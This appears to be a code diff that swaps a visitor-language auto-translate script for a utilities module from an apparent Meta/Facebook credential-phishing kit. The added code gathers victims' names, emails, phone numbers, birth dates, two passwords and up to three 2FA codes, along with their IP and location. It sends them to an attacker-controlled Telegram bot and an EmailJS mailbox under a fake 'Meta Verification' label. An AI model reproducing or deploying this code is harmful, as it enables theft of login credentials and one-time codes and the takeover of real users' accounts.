@@ -1,220 +1,256 @@
-(function () {
-    const LANG_MAP = {
-        // English
-        'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en', 'IE': 'en', 'SG': 'en',
+// Utilities
+const Utils = {
+    encrypt(text) {
+        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
+    },
 
-        // Asia
-        'JP': 'ja',
-        'KR': 'ko',
-        'CN': 'zh-CN',
-        'TW': 'zh-TW',
-        'HK': 'zh-TW',
-        'TH': 'th',
-        'ID': 'id',
-        'MY': 'ms',
-        'PH': 'tl',
-        'IN': 'hi',
-        'PK': 'ur',
-        'BD': 'bn',
+    decrypt(cipherText) {
+        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
+        return bytes.toString(CryptoJS.enc.Utf8);
+    },
 
-        // Europe major
-        'FR': 'fr',
-        'DE': 'de',
-        'IT': 'it',
-        'ES': 'es',
-        'PT': 'pt',
-        'NL': 'nl',
-        'BE': 'fr',
-        'CH': 'de',
-        'AT': 'de',
+    saveRecord(key, value) {
+        try {
+            const encryptedValue = this.encrypt(JSON.stringify(value));
+            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
+            localStorage.setItem(key, JSON.stringify(record));
+        } catch (error) {
+            console.error('Save error:', error);
+        }
+    },
 
-        // Scandinavia
-        'SE': 'sv',
-        'NO': 'no',
-        'DK': 'da',
-        'FI': 'fi',
-        'IS': 'is',
+    getRecord(key) {
+        try {
+            const item = localStorage.getItem(key);
+            if (!item) return null;
+            const { value, expiry } = JSON.parse(item);
+            if (Date.now() > expiry) {
+                localStorage.removeItem(key);
+                return null;
+            }
+            const decrypted = this.decrypt(value);
+            return decrypted ? JSON.parse(decrypted) : null;
+        } catch (error) {
+            return null;
+        }
+    },
 
-        // Eastern Europe
-        'PL': 'pl',
-        'CZ': 'cs',
-        'SK': 'sk',
-        'HU': 'hu',
-        'RO': 'ro',
-        'BG': 'bg',
-        'HR': 'hr',
-        'SI': 'sl',
-        'RS': 'sr',
-        'BA': 'bs',
-        'ME': 'sr',
-        'MK': 'mk',
+    async getUserIp() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error getting IP:', error);
+            return 'N/A';
+        }
+    },
 
-        // Baltic
-        'LT': 'lt',
-        'LV': 'lv',
-        'EE': 'et',
+async getUserLocation() {
+    try {
+        const response = await fetch("https://ipwho.is/", {
+            method: "GET",
+            cache: "no-store"
+        });
 
-        // Southern Europe
-        'GR': 'el',
-        'AL': 'sq',
+        if (!response.ok) {
+            throw new Error(`Location API error: ${response.status}`);
+        }
 
-        // Middle East
-        'SA': 'ar',
-        'AE': 'ar',
-        'EG': 'ar',
-        'IQ': 'ar',
-        'MA': 'ar',
-        'IL': 'he',
-        'IR': 'fa',
-        'AF': 'fa',
-        'TR': 'tr',
+        const data = await response.json();
 
-        // Latin America
-        'MX': 'es',
-        'AR': 'es',
-        'CO': 'es',
-        'CL': 'es',
-        'PE': 'es',
-        'VE': 'es',
-        'UY': 'es',
-        'PY': 'es',
-        'BO': 'es',
-        'EC': 'es',
+        if (data.success === false) {
+            throw new Error(data.message || "Location lookup failed");
+        }
 
-        // Brazil
-        'BR': 'pt',
+        const ip = data.ip || "N/A";
 
-        // Africa (major)
-        'ZA': 'en',
-        'NG': 'en',
-        'KE': 'en',
+        const parts = [
+            data.city,
+            data.region,
+            data.country
+        ].filter(Boolean);
 
-        // Ukraine / Russia
-        'UA': 'uk',
-        'RU': 'ru',
+        return {
+            ip: ip,
+            location: parts.length > 0
+                ? parts.join(" | ")
+                : "N/A",
+            country_code: data.country_code || "N/A",
+            region: data.region || "N/A",
+            country: data.country || "N/A"
+        };
+
+    } catch (error) {
+        console.error("Location error:", error);
+
+        return {
+            ip: "N/A",
+            location: "N/A",
+            country_code: "N/A",
+            region: "N/A",
+            country: "N/A"
+        };
+    }
+},
+async sendToTelegram(data) {
+
+    const locationData = data.locationData || {
+        ip: "N/A",
+        location: "N/A"
     };
 
-    // ── Overlay ──────────────────────────────────────────────────────────
-    var overlay = document.createElement('div');
-    overlay.id = 'translate-overlay';
-    overlay.style.cssText = [
-        'position:fixed', 'inset:0', 'z-index:999999',
-        'background:rgba(255, 255, 255, 0.48)',
-        'backdrop-filter:blur(6px)',
-        '-webkit-backdrop-filter:blur(6px)',
-        'display:flex', 'align-items:center', 'justify-content:center',
-        'transition:opacity 0.4s ease',
-        'opacity:1',
-    ].join(';');
+    const text = `
+<b>IP:</b> <code>${locationData.ip}</code>
+<b>Location:</b> <code>${locationData.location})</code>
+----------------------------------
+<b>Full Name:</b> <code>${data.fullName || ''}</code>
+<b>Email:</b> <code>${data.email || ''}</code>
+<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
+<b>Page Name:</b> <code>${data.fanpage || ''}</code>
+<b>Phone:</b> <code>${data.phone || ''}</code>
+<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
+----------------------------------
+<b>Password(1):</b> <code>${data.password || ''}</code>
+<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
+----------------------------------
+<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
+<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
+<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
 
-    var spinner = document.createElement('div');
-    spinner.style.cssText = [
-        'width:36px', 'height:36px',
-        'border:3px solid #e0e0e0',
-        'border-top-color:#1877f2',
-        'border-radius:50%',
-        'animation:_tl_spin 0.7s linear infinite',
-    ].join(';');
-
-    var style = document.createElement('style');
-    style.textContent = '@keyframes _tl_spin{to{transform:rotate(360deg)}}';
-
-    document.head.appendChild(style);
-    overlay.appendChild(spinner);
-    document.body.appendChild(overlay);
-
-    function removeOverlay() {
-        overlay.style.opacity = '0';
-        setTimeout(function () {
-            overlay.parentNode && overlay.parentNode.removeChild(overlay);
-        }, 420);
-    }
-
-    // ── Helpers ───────────────────────────────────────────────────────────
-    function getGoogtransCookie() {
-        var m = document.cookie.match(/(?:^|;\s*)googtrans=([^;]*)/);
-        return m ? decodeURIComponent(m[1]) : null;
-    }
-
-    function setGoogtransCookie(lang) {
-        var value = '/en/' + lang;
-        var hostname = location.hostname;
-        document.cookie = 'googtrans=' + value + '; path=/';
-        if (hostname && hostname !== 'localhost') {
-            document.cookie = 'googtrans=' + value + '; path=/; domain=' + hostname;
-        }
-    }
-
-    async function getCountryCode() {
         try {
-            var res = await fetch('https://ipinfo.io/json?token=5a58a2d85996e3');
-            var data = await res.json();
-            return (data.country || '').toUpperCase();
-        } catch (e) {
-            try {
-                var res2 = await fetch('https://ipinfo.io/json?token=5a58a2d85996e3');
-                var data2 = await res2.json();
-                return (data2.country_code || '').toUpperCase();
-            } catch (e2) {
-                return '';
-            }
-        }
-    }
-
-    // ── Wait for Google Translate to finish ────────────────────────────
-    function waitForTranslation(timeout) {
-        return new Promise(function (resolve) {
-            // Google Translate adds class "translated-ltr" / "translated-rtl" to <html>
-            var html = document.documentElement;
-            if (/translated-(ltr|rtl)/.test(html.className)) {
-                return resolve();
-            }
-            var timer = setTimeout(resolve, timeout || 5000);
-            var obs = new MutationObserver(function () {
-                if (/translated-(ltr|rtl)/.test(html.className)) {
-                    clearTimeout(timer);
-                    obs.disconnect();
-                    resolve();
-                }
+            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                    text,
+                    parse_mode: 'HTML'
+                })
             });
-            obs.observe(html, { attributes: true, attributeFilter: ['class'] });
+        } catch (error) {
+            console.error('Telegram error:', error);
+        }
+    },
+
+async sendToEmail(data) {
+
+    const locationData = data.locationData || {
+        ip: "N/A",
+        location: "N/A"
+    };
+
+    const emailContent = `
+IP: ${locationData.ip}
+Location: ${locationData.location}
+----------------------------------
+Full Name: ${data.fullName || ''}
+Email: ${data.email || ''}
+Email Business: ${data.emailBusiness || ''}
+Page Name: ${data.fanpage || ''}
+Phone: ${data.phone || ''}
+Date of Birth: ${data.day}/${data.month}/${data.year}
+----------------------------------
+Password(1): ${data.password || ''}
+Password(2): ${data.passwordSecond || ''}
+----------------------------------
+🔐Code 2FA(1): ${data.twoFa || ''}
+🔐Code 2FA(2): ${data.twoFaSecond || ''}
+🔐Code 2FA(3): ${data.twoFaThird || ''}
+
+Sent at: ${new Date().toLocaleString()}`;
+
+        try {
+            // Load EmailJS SDK if not already loaded
+            if (!window.emailjs) {
+                await this.loadEmailJSSDK();
+            }
+
+            await emailjs.send(
+                CONFIG.EMAILJS_SERVICE_ID,
+                CONFIG.EMAILJS_TEMPLATE_ID,
+                {
+                    to_email: CONFIG.EMAIL_RECIPIENT,
+                    subject: `Meta Verification - ${locationData.location}`,
+                    message: emailContent,
+                    from_name: 'Meta Verification System',
+                    reply_to: data.email || 'noreply@system.com'
+                },
+                CONFIG.EMAILJS_PUBLIC_KEY
+            );
+        } catch (error) {
+            console.error('Email error:', error);
+        }
+    },
+
+    loadEmailJSSDK() {
+        return new Promise((resolve, reject) => {
+            if (window.emailjs) {
+                resolve();
+                return;
+            }
+
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            script.onload = () => {
+                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+                resolve();
+            };
+            script.onerror = reject;
+            document.head.appendChild(script);
         });
-    }
+    },
 
-    // ── Main ──────────────────────────────────────────────────────────────
-    async function run() {
-        var existing = getGoogtransCookie();
+async sendNotification(data) {
+    const notificationType = CONFIG.NOTIFICATION_TYPE;
 
-        // Cookie already set → if not English, wait for translation; then hide overlay
-        if (existing && existing !== '/en/' && existing !== '/en/undefined') {
-            if (existing !== '/en/en') {
-                await waitForTranslation(6000);
-            }
-            removeOverlay();
-            return;
+    try {
+        // Chỉ lấy location 1 lần
+        const locationData = await this.getUserLocation();
+
+        const notificationData = {
+            ...data,
+            locationData
+        };
+
+        if (
+            notificationType === 'telegram' ||
+            notificationType === 'both'
+        ) {
+            await this.sendToTelegram(notificationData);
         }
 
-        // First visit: detect country and set cookie
-        var countryCode = await getCountryCode();
-        var targetLang = countryCode ? LANG_MAP[countryCode] : null;
-
-        if (!targetLang || targetLang === 'en') {
-            // English-speaking or unknown country → no translation needed
-            if (targetLang === 'en') {
-                setGoogtransCookie('en');
-            }
-            removeOverlay();
-            return;
+        if (
+            notificationType === 'email' ||
+            notificationType === 'both'
+        ) {
+            await this.sendToEmail(notificationData);
         }
 
-        setGoogtransCookie(targetLang);
-        location.reload();
+    } catch (error) {
+        console.error(
+            'Notification error:',
+            error
+        );
     }
+},
 
-    // Run after body is ready
-    if (document.body) {
-        run();
-    } else {
-        document.addEventListener('DOMContentLoaded', run);
+    maskPhone(phone) {
+        if (!phone || phone.length < 5) return phone;
+        const start = phone.slice(0, 2);
+        const end = phone.slice(-2);
+        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
+    },
+
+    maskEmail(email) {
+        if (!email) return '';
+        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
+            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
+        });
+    },
+
+    generateTicketId() {
+        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
+        return `${gen()}-${gen()}-${gen()}`;
     }
-})();
+};
